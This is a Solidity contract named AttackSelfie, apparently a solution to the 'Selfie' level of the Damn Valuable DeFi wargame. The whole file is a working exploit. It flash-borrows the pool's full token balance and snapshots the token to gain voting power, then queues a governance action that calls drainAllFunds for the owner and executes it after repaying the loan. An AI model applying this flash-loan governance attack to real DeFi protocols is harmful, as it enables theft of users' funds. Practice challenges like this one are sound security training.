pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

contract AttackSelfie {
    address immutable owner;
    SelfiePool immutable selfiePool;
    SimpleGovernance immutable simpleGovernance;
    DamnValuableTokenSnapshot token;

    uint256 actionId;

    constructor(
        address _owner,
        address _token,
        address _selfiePool,
        address _simpleGovernance
    ) {
        owner = _owner;
        token = DamnValuableTokenSnapshot(_token);
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function attack() public {
        selfiePool.flashLoan(token.balanceOf(address(selfiePool)));
    }

    function receiveTokens(DamnValuableTokenSnapshot token, uint256 amount) public {
        token.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(owner)
            ),
            0
        );
        token.transfer(address(selfiePool), amount);
    }

    function drain() public {
        simpleGovernance.executeAction(actionId);
    }
}

